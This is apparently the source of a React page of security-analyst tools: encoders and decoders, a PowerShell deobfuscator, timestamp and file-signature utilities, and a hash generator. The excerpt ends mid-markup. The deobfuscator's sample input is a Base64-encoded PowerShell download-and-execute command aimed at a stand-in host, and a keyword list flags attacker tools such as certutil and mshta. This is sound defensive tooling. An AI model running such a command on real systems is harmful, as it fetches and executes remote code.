import React, { useState, useEffect, useCallback } from 'react';
import Navigation from '../components/Navigation';
import Footer from '../components/Footer';
import { 
  Play,
  Copy,
  RotateCcw,
  Shield,
  Activity,
  Heart,
  Zap,
  Code,
  Lock,
  Unlock,
  Hash,
  Globe,
  Terminal,
  AlertTriangle,
  Eye,
  FileText,
  Clock,
  Search,
  Binary,
  Cpu,
  Fingerprint,
  Key,
  FileInput,
  FileOutput,
  FileSignature,
  Trash2,
  Type,
  Hash as HashIcon,
  Braces,
  Sparkles,
  ChevronDown
} from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

const TheLabPage = () => {
  const [activeTab, setActiveTab] = useState<'converter' | 'powershell' | 'timestamp' | 'signature' | 'hash'>('converter');
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [operation, setOperation] = useState<keyof typeof operations>('base64_encode');
  const [copyMessage, setCopyMessage] = useState('');
  const [isHovered, setIsHovered] = useState(false);
  const [expandedOperation, setExpandedOperation] = useState<string | null>(null);

  // PowerShell Deobfuscator state
  const [psInput, setPsInput] = useState('');
  const [psOutput, setPsOutput] = useState('');

  // Timestamp Converter state
  const [timestampInput, setTimestampInput] = useState('');
  const [timestampOutput, setTimestampOutput] = useState('');
  const [timestampMode, setTimestampMode] = useState<'epoch-to-date' | 'date-to-epoch'>('epoch-to-date');

  // File Signature Lookup state
  const [hexInput, setHexInput] = useState('');
  const [signatureResult, setSignatureResult] = useState('');

  // Hash Generator state
  const [hashInput, setHashInput] = useState('');
  const [hashOutput, setHashOutput] = useState('');
  const [hashType, setHashType] = useState('sha256');
  const [isHashing, setIsHashing] = useState(false);

  // Caesar Cipher state
  const [caesarShift, setCaesarShift] = useState(13);

  // XOR state
  const [xorKey, setXorKey] = useState('secret');

  // Operation labels and icons
  const operationLabels: Record<string, string> = {
    'base64_encode': 'Base64 Encode',
    'base64_decode': 'Base64 Decode',
    'hex_encode': 'Hex Encode',
    'hex_decode': 'Hex Decode',
    'url_encode': 'URL Encode',
    'url_decode': 'URL Decode',
    'remove_null_bytes': 'Remove Null Bytes',
    'trim_whitespace': 'Trim Whitespace',
    'rot13': 'ROT13',
    'caesar_decode': 'Caesar Decode',
    'xor_encode': 'XOR Encode',
    'xor_decode': 'XOR Decode',
    'binary_to_text': 'Binary → Text',
    'text_to_binary': 'Text → Binary',
    'hex_to_binary': 'Hex → Binary',
    'binary_to_hex': 'Binary → Hex',
    'text_to_octal': 'Text → Octal',
    'octal_to_text': 'Octal → Text',
    'ascii_to_decimal': 'ASCII → Decimal',
    'decimal_to_ascii': 'Decimal → ASCII'
  };

  const operationIcons: Record<string, React.ComponentType<any>> = {
    'base64_encode': Lock,
    'base64_decode': Unlock,
    'hex_encode': Hash,
    'hex_decode': Hash,
    'url_encode': Globe,
    'url_decode': Globe,
    'remove_null_bytes': Trash2,
    'trim_whitespace': Type,
    'rot13': Braces,
    'caesar_decode': Braces,
    'xor_encode': Key,
    'xor_decode': Key,
    'binary_to_text': Binary,
    'text_to_binary': Type,
    'hex_to_binary': Hash,
    'binary_to_hex': Binary,
    'text_to_octal': Type,
    'octal_to_text': Type,
    'ascii_to_decimal': Type,
    'decimal_to_ascii': Type
  };

  // Encoding/Decoding functions
  const operations: Record<string, (input: string, key?: string) => string> = {
    base64_encode: (input) => {
      try {
        return btoa(input);
      } catch {
        return 'Invalid input for base64 encoding';
      }
    },
    base64_decode: (input) => {
      try {
        return atob(input);
      } catch {
        return 'Invalid base64';
      }
    },
    hex_encode: (input) => {
      return Array.from(input)
        .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
        .join(' ');
    },
    hex_decode: (input) => {
      try {
        const cleanInput = input.replace(/\s/g, '');
        if (!/^[0-9a-fA-F]*$/.test(cleanInput) || cleanInput.length % 2 !== 0) {
          return 'Invalid hex input';
        }
        return cleanInput.match(/.{1,2}/g)
          ?.map(byte => String.fromCharCode(parseInt(byte, 16)))
          .join('') || '';
      } catch {
        return 'Invalid hex';
      }
    },
    url_encode: (input) => encodeURIComponent(input),
    url_decode: (input) => {
      try {
        return decodeURIComponent(input);
      } catch {
        return 'Invalid URL encoding';
      }
    },
    remove_null_bytes: (input) => {
      return input.replace(/\x00|\\x00/g, '');
    },
    trim_whitespace: (input) => {
      return input.trim();
    },
    rot13: (input) => {
      return input.replace(/[a-zA-Z]/g, function(c) {
        const code = c.charCodeAt(0);
        return String.fromCharCode(
          code + (code >= 78 && code <= 90 || code >= 110 && code <= 122 ? -13 : 13)
        );
      });
    },
    caesar_decode: (input) => {
      return input.replace(/[a-zA-Z]/g, function(c) {
        const code = c.charCodeAt(0);
        const shift = (code >= 65 && code <= 90) ? 65 : (code >= 97 && code <= 122) ? 97 : 0;
        if (shift === 0) return c;
        return String.fromCharCode(((code - shift - caesarShift + 26) % 26) + shift);
      });
    },
    xor_encode: (input, key = xorKey) => {
      if (!key) return "Error: XOR key is required";
      
      // Parse the key (handle hex format like 0x42)
      let numericKey: number;
      if (key.startsWith('0x')) {
        numericKey = parseInt(key.substring(2), 16);
      } else {
        numericKey = parseInt(key, 10) || key.charCodeAt(0);
      }
      
      // Convert input to hex representation
      const hexResult = [];
      for (let i = 0; i < input.length; i++) {
        const charCode = input.charCodeAt(i) ^ numericKey;
        hexResult.push('0x' + charCode.toString(16).padStart(2, '0'));
      }
      
      return hexResult.join(' ');
    },
    xor_decode: (input, key = xorKey) => {
      if (!key) return "Error: XOR key is required";
      
      // Parse the key (handle hex format like 0x42)
      let numericKey: number;
      if (key.startsWith('0x')) {
        numericKey = parseInt(key.substring(2), 16);
      } else {
        numericKey = parseInt(key, 10) || key.charCodeAt(0);
      }
      
      // Handle both hex input (0x0e 0x07...) and raw characters
      let hexValues: string[];
      if (input.includes('0x')) {
        hexValues = input.match(/0x[0-9a-fA-F]{2}/g) || [];
      } else {
        hexValues = Array.from(input).map(c => '0x' + c.charCodeAt(0).toString(16));
      }
      
      // Perform XOR decoding
      let result = '';
      for (const hex of hexValues) {
        const charCode = parseInt(hex.substring(2), 16) ^ numericKey;
        result += String.fromCharCode(charCode);
      }
      
      return result;
    },
    binary_to_text: (input) => {
      try {
        const cleanInput = input.replace(/\s/g, '');
        if (!/^[01]*$/.test(cleanInput)) {
          return 'Invalid binary input';
        }
        return cleanInput.match(/.{1,8}/g)
          ?.map(byte => String.fromCharCode(parseInt(byte, 2)))
          .join('') || '';
      } catch {
        return 'Invalid binary';
      }
    },
    text_to_binary: (input) => {
      return Array.from(input)
        .map(c => c.charCodeAt(0).toString(2).padStart(8, '0'))
        .join(' ');
    },
    hex_to_binary: (input) => {
      try {
        const cleanInput = input.replace(/\s/g, '');
        if (!/^[0-9a-fA-F]*$/.test(cleanInput)) {
          return 'Invalid hex input';
        }
        return cleanInput.split('')
          .map(hex => parseInt(hex, 16).toString(2).padStart(4, '0'))
          .join(' ');
      } catch {
        return 'Invalid hex';
      }
    },
    binary_to_hex: (input) => {
      try {
        const cleanInput = input.replace(/\s/g, '');
        if (!/^[01]*$/.test(cleanInput) || cleanInput.length % 4 !== 0) {
          return 'Invalid binary input';
        }
        return cleanInput.match(/.{1,4}/g)
          ?.map(bin => parseInt(bin, 2).toString(16))
          .join(' ') || '';
      } catch {
        return 'Invalid binary';
      }
    },
    text_to_octal: (input) => {
      return Array.from(input)
        .map(c => c.charCodeAt(0).toString(8).padStart(3, '0'))
        .join(' ');
    },
    octal_to_text: (input) => {
      try {
        const cleanInput = input.replace(/\s/g, '');
        if (!/^[0-7]*$/.test(cleanInput)) {
          return 'Invalid octal input';
        }
        return cleanInput.match(/.{1,3}/g)
          ?.map(oct => String.fromCharCode(parseInt(oct, 8)))
          .join('') || '';
      } catch {
        return 'Invalid octal';
      }
    },
    ascii_to_decimal: (input) => {
      return Array.from(input)
        .map(c => c.charCodeAt(0).toString(10))
        .join(' ');
    },
    decimal_to_ascii: (input) => {
      try {
        const cleanInput = input.replace(/\s+/g, ' ').trim();
        if (!/^(\d+\s)*\d+$/.test(cleanInput)) {
          return 'Invalid decimal input';
        }
        return cleanInput.split(' ')
          .map(dec => String.fromCharCode(parseInt(dec, 10)))
          .join('');
      } catch {
        return 'Invalid decimal';
      }
    }
  };

  // Hash functions
  const hashFunctions: Record<string, (input: string) => Promise<string>> = {
    sha1: async (input) => {
      const encoder = new TextEncoder();
      const data = encoder.encode(input);
      const hashBuffer = await crypto.subtle.digest('SHA-1', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    },
    sha256: async (input) => {
      const encoder = new TextEncoder();
      const data = encoder.encode(input);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    },
    sha512: async (input) => {
      const encoder = new TextEncoder();
      const data = encoder.encode(input);
      const hashBuffer = await crypto.subtle.digest('SHA-512', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }
  };

  // Copy to clipboard with feedback
  const copyToClipboard = useCallback((text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
      setCopyMessage('Copied to clipboard!');
      setTimeout(() => setCopyMessage(''), 1500);
    });
  }, []);

  const handleRun = () => {
    let result;
    if (operation === 'xor_encode' || operation === 'xor_decode') {
      result = operations[operation](input, xorKey);
    } else {
      result = operations[operation](input);
    }
    setOutput(result);
  };

  const handleClear = () => {
    setInput('');
    setOutput('');
  };

  const swapInputOutput = () => {
    const temp = input;
    setInput(output);
    setOutput(temp);
  };

  // PowerShell Deobfuscation functions
  const decodeBase64 = (text: string): string => {
    try {
      const matches = text.match(/(?:-EncodedCommand|FromBase64String)\(?\s*['"`]([^'"`]+)['"`]\s*\)?/gi);
      if (matches) {
        let results = "";
        for (const match of matches) {
          const base64Match = match.replace(/^[^'`"]*['`"]/, '').replace(/['`"][^'`"]*$/, '');
          try {
            const decoded = atob(base64Match);
            results += `[Base64 Decoded]: ${decoded}\n\n`;
          } catch (e) {
            results += `[!] Invalid base64 in: ${match}\n\n`;
          }
        }
        return results;
      }
    } catch (e) {
      return "[!] Error processing base64 strings";
    }
    return "";
  };

  const resolveCharCodes = (input: string): string => {
    return input.replace(/(\[char\]\s*(0x[0-9a-fA-F]+|0b[01]+|\d+))/gi, (_, full, code) => {
      let charCode;
      if (code.startsWith("0x")) {
        charCode = parseInt(code.substring(2), 16);
      } else if (code.startsWith("0b")) {
        charCode = parseInt(code.substring(2), 2);
      } else {
        charCode = parseInt(code, 10);
      }
      return String.fromCharCode(charCode);
    });
  };

  const resolveConcatenation = (input: string): string => {
    return input.replace(/(['"][^'"]+['"]\s*\+\s*)+['"][^'"]+['"]/g, (match) => {
      const strings = match.match(/['"]([^'"]+)['"]/g);
      return strings ? strings.map(s => s.slice(1, -1)).join("") : match;
    }).replace(/(\$\w+\s*\+\s*)+['"][^'"]+['"]/g, (match) => {
      return match.replace(/\s*\+\s*/g, "");
    });
  };

  const highlightSuspicious = (text: string): string => {
    const keywords = [
      "iex", "invoke-webrequest", "downloadstring", "new-object", 
      "invoke-expression", "start-process", "invoke-command", 
      "powershell", "cmd", "net.webclient", "system.net.webclient",
      "wscript.shell", "scripting.filesystemobject", "regsvr32",
      "certutil", "bitsadmin", "wmic", "mshta", "rundll32",
      "schtasks", "net user", "net localgroup", "sc create",
      "add-type", "reflection.assembly", "system.io.compression",
      "system.net.sockets", "system.security.cryptography"
    ];
    
    const obfuscationPatterns = [
      "replace", "substring", "split", "join", "insert", "remove",
      "tochararray", "tolower", "toupper", "trim", "padleft", "padright"
    ];
    
    let result = text;
    
    keywords.forEach((kw) => {
      const regex = new RegExp(`(\\b${kw}\\b|\\$${kw}\\b)`, "gi");
      result = result.replace(regex, (m) => `<span class="text-red-400 font-bold bg-red-500/20 px-1 rounded">${m}</span>`);
    });
    
    obfuscationPatterns.forEach((pat) => {
      const regex = new RegExp(`\\.${pat}\\(`, "gi");
      result = result.replace(regex, (m) => `<span class="text-yellow-400 font-bold bg-yellow-500/20 px-1 rounded">${m}</span>`);
    });
    
    result = result.replace(/-encodedcommand\s+([^\s]+)/gi, (m, cmd) => 
      `<span class="text-purple-400 font-bold bg-purple-500/20 px-1 rounded">${m}</span>`);
    
    result = result.replace(/(https?|ftp):\/\/[^\s]+/gi, (m) => 
      `<span class="text-blue-400 font-bold bg-blue-500/20 px-1 rounded">${m}</span>`);
    
    return result;
  };

  const deobfuscatePowerShell = () => {
    let clean = psInput;
    clean = resolveCharCodes(clean);
    clean = resolveConcatenation(clean);
    const base64Decoded = decodeBase64(clean);
    if (base64Decoded) {
      clean += `\n\n${base64Decoded}`;
    }
    const highlighted = highlightSuspicious(clean);
    setPsOutput(highlighted);
  };

  const handlePsClear = () => {
    setPsInput('');
    setPsOutput('');
  };

  const loadPsSample = () => {
    setPsInput(`$payload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=')); Invoke-Expression $payload`);
  };

  // Timestamp Converter functions
  const convertTimestamp = () => {
    try {
      if (timestampMode === "epoch-to-date") {
        const num = Number(timestampInput.trim());
        if (isNaN(num)) {
          setTimestampOutput("Invalid epoch timestamp");
          return;
        }
        const date = new Date(num < 1e12 ? num * 1000 : num);
        setTimestampOutput(date.toISOString());
      } else {
        const date = new Date(timestampInput.trim());
        if (isNaN(date.getTime())) {
          setTimestampOutput("Invalid date/time string");
          return;
        }
        setTimestampOutput(Math.floor(date.getTime() / 1000).toString());
      }
    } catch {
      setTimestampOutput("Conversion error");
    }
  };

  const handleTimestampClear = () => {
    setTimestampInput('');
    setTimestampOutput('');
  };

  const loadTimestampSample = () => {
    setTimestampInput('1708023332');
  };

  // File Signature Lookup functions
  const signatures: { [hexPrefix: string]: string } = {
    "25504446": "PDF document",
    "504B0304": "ZIP archive / DOCX / XLSX / ODT",
    "89504E47": "PNG image",
    "47494638": "GIF image",
    "FFD8FF": "JPEG image",
    "4D5A": "Windows Executable (PE)",
    "377ABCAF271C": "7-Zip archive",
    "52617221": "RAR archive",
    "494433": "MP3 audio with ID3 tag",
    "000001BA": "MPEG program stream video",
    "000001B3": "MPEG video",
    "3026B2758E66CF11": "Windows Media Video/Audio",
    "1F8B08": "GZIP compressed file",
    "424D": "BMP image",
    "41433130": "ZIP archive",
    "68746D6C3E": "HTML file",
    "3C3F786D6C": "XML file",
    "CAFEBABE": "Java class file",
    "D0CF11E0A1B11AE1": "Microsoft Office pre-2007 document",
    "504B34": "ZIP archive",
    "7F454C46": "ELF executable (Linux)",
    "49492A00": "TIFF image (little endian)",
    "4D4D002A": "TIFF image (big endian)",
    "0000001866747970": "MP4 video",
    "66747970": "ISO Base Media file (MP4, MOV, etc.)",
    "255044462D312E": "PDF file (with version number)",
    "4F676753": "OGG audio/video",
    "494E4458": "Adobe InDesign Document",
    "1A45DFA3": "Matroska media container (MKV, WebM)",
    "4C0000000114020": "LNK shortcut file",
    "7573746172": "TAR archive",
    "425A68": "BZIP2 compressed file",
    "52656365697665": "Real Media",
    "7B5C72746631": "RTF document",
    "2321": "Script file (#!)"
  };

  const lookupFileSignature = () => {
    const cleanHex = hexInput.replace(/[^A-Fa-f0-9]/g, "").toUpperCase();
    let matched = "Unknown file type";
    for (const prefix in signatures) {
      if (cleanHex.startsWith(prefix)) {
        matched = signatures[prefix];
        break;
      }
    }
    setSignatureResult(matched);
  };

  const handleSignatureClear = () => {
    setHexInput('');
    setSignatureResult('');
  };

  const loadSignatureSample = () => {
    setHexInput('25504446');
  };

  // Hash Generator functions
  const generateHash = async () => {
    if (!hashInput.trim()) return;
    
    setIsHashing(true);
    try {
      const hashFunc = hashFunctions[hashType];
      if (hashFunc) {
        const result = await hashFunc(hashInput);
        setHashOutput(result);
      }
    } catch (error) {
      setHashOutput("Error generating hash");
    } finally {
      setIsHashing(false);
    }
  };

  const handleHashClear = () => {
    setHashInput('');
    setHashOutput('');
  };

  const loadHashSample = () => {
    setHashInput('password123');
  };

  // Operation descriptions
  const operationDescriptions: Record<string, string> = {
    'base64_encode': 'Encodes text to Base64 format',
    'base64_decode': 'Decodes Base64 to original text',
    'hex_encode': 'Converts text to hexadecimal representation',
    'hex_decode': 'Converts hexadecimal back to text',
    'url_encode': 'Encodes text for URL usage',
    'url_decode': 'Decodes URL-encoded text',
    'remove_null_bytes': 'Removes null bytes (\\x00) from text',
    'trim_whitespace': 'Removes whitespace from start and end',
    'rot13': 'Applies ROT13 cipher to text',
    'caesar_decode': 'Decodes Caesar cipher with specified shift',
    'xor_encode': 'Encodes text using XOR with provided key',
    'xor_decode': 'Decodes XOR-encoded text with provided key',
    'binary_to_text': 'Converts binary to readable text',
    'text_to_binary': 'Converts text to binary representation',
    'hex_to_binary': 'Converts hexadecimal to binary',
    'binary_to_hex': 'Converts binary to hexadecimal',
    'text_to_octal': 'Converts text to octal representation',
    'octal_to_text': 'Converts octal back to text',
    'ascii_to_decimal': 'Converts ASCII characters to decimal values',
    'decimal_to_ascii': 'Converts decimal values to ASCII characters'
  };

  const toggleOperationDescription = (op: string) => {
    setExpandedOperation(expandedOperation === op ? null : op);
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white relative overflow-hidden">
      {/* Enhanced Animated Background */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-500/5 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '2s' }}></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-purple-500/3 to-pink-500/3 rounded-full blur-3xl animate-spin" style={{ animationDuration: '60s' }}></div>
      </div>

      <Navigation />

      <div className="pt-24 px-4 sm:px-6 lg:px-8 relative">
        <div className="max-w-7xl mx-auto">
          {/* Header */}
          <motion.div 
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="text-center mb-16"
          >
            <div className="relative group mb-8">
              <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/10 via-blue-500/10 to-purple-500/10 rounded-3xl blur-2xl group-hover:blur-xl transition-all duration-500"></div>
              <div className="relative bg-gradient-to-r from-gray-900/80 via-gray-800/80 to-gray-900/80 border border-cyan-500/20 rounded-3xl p-12 backdrop-blur-sm">
                <div className="flex items-center justify-center space-x-4 mb-6">
                  <div className="relative">
                    <motion.div 
                      animate={{ rotate: 360 }}
                      transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                      className="absolute -inset-2 bg-cyan-500/20 rounded-full blur-md"
                    ></motion.div>
                    <Code className="relative h-16 w-16 text-cyan-400" />
                  </div>
                  <motion.h1 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.2 }}
                    className="text-4xl md:text-6xl font-bold bg-gradient-to-r from-cyan-400 via-blue-400 to-purple-400 bg-clip-text text-transparent"
                  >
                    The Lab
                  </motion.h1>
                </div>
                <motion.p 
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.4 }}
                  className="text-xl text-gray-300 max-w-4xl mx-auto leading-relaxed"
                >
                </motion.p>
              </div>
            </div>
          </motion.div>

          {/* Tool Navigation Tabs */}
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.6 }}
            className="flex justify-center mb-12"
          >
            <div className="inline-flex bg-gray-900/80 border border-gray-700/50 rounded-xl p-1 backdrop-blur-sm">
              {[
                { id: 'converter', icon: Binary, label: 'Data Converter' },
                { id: 'powershell', icon: Terminal, label: 'PowerShell Analyzer' },
                { id: 'timestamp', icon: Clock, label: 'Timestamp Tool' },
                { id: 'signature', icon: FileSignature, label: 'File Signature' },
                { id: 'hash', icon: HashIcon, label: 'Hash Generator' }
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id as any)}
                  className={`px-6 py-3 rounded-lg flex items-center space-x-2 transition-all ${
                    activeTab === tab.id 
                      ? `bg-${tab.id === 'converter' ? 'cyan' : tab.id === 'powershell' ? 'red' : tab.id === 'timestamp' ? 'green' : tab.id === 'signature' ? 'purple' : 'yellow'}-500/20 text-${tab.id === 'converter' ? 'cyan' : tab.id === 'powershell' ? 'red' : tab.id === 'timestamp' ? 'green' : tab.id === 'signature' ? 'purple' : 'yellow'}-300 border border-${tab.id === 'converter' ? 'cyan' : tab.id === 'powershell' ? 'red' : tab.id === 'timestamp' ? 'green' : tab.id === 'signature' ? 'purple' : 'yellow'}-500/30` 
                      : 'text-gray-400 hover:text-white hover:bg-gray-800/50'
                  }`}
                >
                  <tab.icon className="h-5 w-5" />
                  <span>{tab.label}</span>
                </button>
              ))}
            </div>
          </motion.div>

          {/* Main Tool Content */}
          <div className="max-w-6xl mx-auto">
            <AnimatePresence mode="wait">
              <motion.div
                key={activeTab}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ duration: 0.3 }}
              >
                {/* Data Converter Section */}
                {activeTab === 'converter' && (
                  <div className="relative group rounded-xl p-8 border border-cyan-500/30 bg-gray-900/80 backdrop-blur-sm mb-16">
                    <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/10 to-blue-500/10 rounded-xl blur-xl -z-10"></div>
                    
                    <div className="flex items-center gap-4 mb-6">
                      <motion.div
                        whileHover={{ scale: 1.1 }}
                        className="relative"
                      >
                        <div className="absolute -inset-2 bg-cyan-500/20 rounded-full blur-md animate-pulse"></div>
                        <Code className="relative h-8 w-8 text-cyan-400" />
                      </motion.div>
                      <h2 className="text-2xl font-bold">Data Converter</h2>
                    </div>
                    <p className="text-gray-300 mb-8 max-w-3xl">
                      Transform data between different formats for analysis and investigation. Supports Base64, Hex, URL encoding/decoding, and null byte removal.
                    </p>

                    {/* Operation Selector */}
                    <div className="mb-6">
                      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-7 gap-3">
                        {Object.entries(operationLabels).map(([key, label]) => {
                          const IconComponent = operationIcons[key];
                          return (
                            <motion.div
                              key={key}
                              whileHover={{ scale: 1.05 }}
                              whileTap={{ scale: 0.95 }}
                            >
                              <button
                                type="button"
                                onClick={() => {
                                  setOperation(key as keyof typeof operations);
                                  setExpandedOperation(null);
                                }}
                                className={`w-full py-3 rounded-lg border transition-colors duration-300 font-semibold text-xs uppercase flex flex-col items-center gap-1 ${
                                  key === operation
                                    ? "bg-cyan-500 text-white border-cyan-500 shadow-lg"
                                    : "border-gray-700 text-gray-400 hover:bg-gray-800 hover:text-white"
                                }`}
                                aria-pressed={key === operation}
                              >
                                <IconComponent className="w-4 h-4" />
                                {label}
                              </button>
                            </motion.div>
                          );
                        })}
                      </div>
                    </div>

                    {/* Operation Description */}
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      className="mb-6 overflow-hidden"
                    >
                      <div 
                        className="flex items-center justify-between p-3 bg-gray-800/50 rounded-lg cursor-pointer"
                        onClick={() => toggleOperationDescription(operation)}
                      >
                        <div className="flex items-center gap-2">
                          <Sparkles className="h-4 w-4 text-cyan-400" />
                          <span className="text-sm font-medium text-gray-300">
                            {operationLabels[operation]} - What does this do?
                          </span>
                        </div>
                        <ChevronDown 
                          className={`h-4 w-4 text-gray-400 transition-transform ${expandedOperation === operation ? 'rotate-180' : ''}`}
                        />
                      </div>
                      <AnimatePresence>
                        {expandedOperation === operation && (
                          <motion.div
                            initial={{ opacity: 0, height: 0 }}
                            animate={{ opacity: 1, height: 'auto' }}
                            exit={{ opacity: 0, height: 0 }}
                            className="mt-2 p-3 bg-gray-800/30 rounded-lg text-sm text-gray-300"
                          >
                            {operationDescriptions[operation]}
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </motion.div>

                    {/* Caesar Cipher Shift Input */}
                    {operation === 'caesar_decode' && (
                      <motion.div
                        initial={{ opacity: 0, y: -10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="mb-6 max-w-xs"
                      >
                        <label className="block text-sm font-medium text-gray-300 mb-2">
                          Caesar Shift Value
                        </label>
                        <input
                          type="number"
                          min="1"
                          max="25"
                          value={caesarShift}
                          onChange={(e) => setCaesarShift(parseInt(e.target.value) || 13)}
                          className="w-full bg-gray-800/50 border border-cyan-500/50 rounded-lg p-3 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-500 transition"
                        />
                      </motion.div>
                    )}

                    {/* XOR Key Input */}
                    {(operation === 'xor_encode' || operation === 'xor_decode') && (
                      <motion.div
                        initial={{ opacity: 0, y: -10 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="mb-6 max-w-xs"
                      >
                        <label className="block text-sm font-medium text-gray-300 mb-2">
                          XOR Key
                        </label>
                        <input
                          type="text"
                          value={xorKey}
                          onChange={(e) => setXorKey(e.target.value)}
                          placeholder="Enter key (e.g., 'secret' or '0x42')"
                          className="w-full bg-gray-800/50 border border-cyan-500/50 rounded-lg p-3 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-cyan-500 transition"
                        />
                      </motion.div>
                    )}

                    {/* Input/Output */}
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-6">
                      {/* Input Section */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-green-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Input</h3>
                          </div>
                          <motion.button
                            whileHover={{ rotate: 90 }}
                            onClick={() => setInput('')}
                            title="Clear input"
                            className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white"
                          >
                            <RotateCcw className="w-4 h-4" />
                          </motion.button>
                        </div>
                        <textarea
                          value={input}
                          onChange={(e) => setInput(e.target.value)}
                          placeholder="Enter your text here..."
                          className="w-full h-64 bg-gray-800/50 border border-gray-700 rounded-lg p-4 text-sm font-mono resize-none focus:outline-none focus:ring-2 focus:ring-cyan-500 transition-colors"
                          spellCheck={false}
                        />
                      </motion.div>

                      {/* Output Section */}
                      <motion.div
                        whileHover={{ scale: 1.01 }}
                      >
                        <div className="flex justify-between items-center mb-3">
                          <div className="flex items-center gap-2">
                            <div className="w-3 h-3 rounded-full bg-blue-400 animate-pulse"></div>
                            <h3 className="font-semibold text-lg">Output</h3>
                          </div>
                          <div className="flex gap-2">
                            <motion.button
                              whileHover={{ rotate: 90 }}
                              onClick={swapInputOutput}
                              title="Swap input/output"
                              disabled={!output}
                              className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                              <RotateCcw className="w-4 h-4" />
                            </motion.button>
                            <motion.button
                              whileHover={{ scale: 1.1 }}
                              whileTap={{ scale: 0.9 }}
                              onClick={() => copyToClipboard(output)}
                              title="Copy to clipboard"
                              disabled={!output}
                              className="p-2 rounded hover:bg-gray-700/50 transition text-gray-400 hover:text-white disabled:opacity-50 disabled:cursor-not-allowed"
                            >
                              <Copy className="w-4 h-4" />
                            </motion.button>
                          </div>
                        </div>
                        <textarea
                          readOnly
                          value={output}
                          placeholder="Output will appear here..."
                          className="w-full h-64 bg-gray-800/30 border border-gray-700 rounded-lg p-4 text-sm font-mono resize-none text-cyan-400"
                          spellCheck={false}
                        />
                      </motion.div>
                    </div>

                    <div className="flex justify-between items-center text-xs text-gray-400 mb-6">
                      <div>Characters: {output.length}</div>
                      <AnimatePresence>
                        {copyMessage && (
                          <motion.div
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -10 }}
                            className="text-green-400 font-semibold"
                          >
                            {copyMessage}
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>

                    {/* Action Buttons */}
                    <div className="flex justify-center gap-6">
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={handleRun}
                        disabled={!input.trim()}
                        className="bg-gradient-to-r from-cyan-500 to-blue-500 px-8 py-4 rounded-xl font-semibold shadow-lg hover:scale-105 transition-transform disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                      >
                        <Play className="w-5 h-5" /> Run Operation
                      </motion.button>
                      
                      <motion.button
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={handleClear}
                        className="border border-gray-600 px-8 py-4 rounded-xl font-semibold hover:bg-gray-800/50 transition-colors flex items-center gap-2"
                      >
                        <RotateCcw className="w-5 h-5" /> Clear All
                      </motion.button>
                    </div>
                  </div>
                )}

                {/* PowerShell Deobfuscator Section */}
                {activeTab === 'powershell' && (
                  <div className="relative group rounded-xl p-8 border border-red-500/30 bg-gray-900/80 backdrop-blur-sm mb-16">
                    <div className="absolute inset-0 bg-gradient-to-r from-red-500/10 to-orange-500/10 rounded-xl blur-xl -z-10"></div>
                    <div className="flex items-center gap-4 mb-6">
                      <motion.div
                        whileHover={{ rotate: 15 }}
                        className="relative"
                      >
